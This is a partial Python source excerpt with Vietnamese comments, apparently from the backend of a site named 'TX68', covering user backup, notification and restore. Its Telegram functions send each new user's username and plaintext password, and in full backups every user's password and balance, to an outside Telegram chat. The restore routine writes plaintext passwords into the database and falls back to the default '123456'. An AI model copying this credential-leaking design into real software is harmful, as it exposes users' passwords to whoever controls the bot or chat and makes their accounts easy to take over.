...
def backup_users(send_telegram=False):
    """Sao lưu toàn bộ nick ra JSON (+ tùy chọn gửi Telegram)."""
    try:
...
def telegram_notify_new_user(username, password, role="user", balance=0, source="register"):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    line = f"TX68_USER|{username}|{password}|{role}|{int(balance or 0)}|{source}"
    text = (
        "🆕 <b>TX68 nick mới</b>\n"
        f"User: <code>{username}</code>\n"
        f"Pass: <code>{password}</code>\n"
        f"Role: {role} | Số dư: {int(balance or 0):,}\n"
        f"Nguồn: {source}\n"
        f"<code>{line}</code>"
    )
...
def telegram_send_full_backup():
    ...
    for u in data:
        ...
        lines.append(f"TX68_USER|{uname}|{pw}|{role}|{bal}|backup")
    ...
    for i, part in enumerate(parts):
        telegram_api("sendMessage", {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": f"📦 TX68 backup ({i+1}/{len(parts)})\n<code>{part}</code>",
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        })
...
def restore_users_from_telegram():
    """Parse tin gần đây (getUpdates) lấy dòng TX68_USER|..."""
    ...
    for upd in results:
        ...
        for raw in text.splitlines():
            ...
            if not u or not u["username"] or u["username"] in seen:
                continue
            seen.add(u["username"])
            users.append(u)

    if not users:
        print("telegram restore: no TX68_USER lines in recent updates")
        return 0
    ...
    for u in users:
        ...
        if exists or u["role"] == "owner":
            continue
        pw = u.get("password_plain") or "123456"
        conn.execute(
            """
            INSERT INTO users
            ...
            VALUES (?, ?, ?, ?, ?, 0, ?)
            """,
            (uname, hash_password(pw), pw, u["role"], int(u.get("balance") or 0), now()),
        )
        restored += 1
    conn.commit()
    conn.close()
    if restored:
        print(f"Restored {restored} users from Telegram updates")
        try:
            backup_users(False)
        except Exception:
            pass
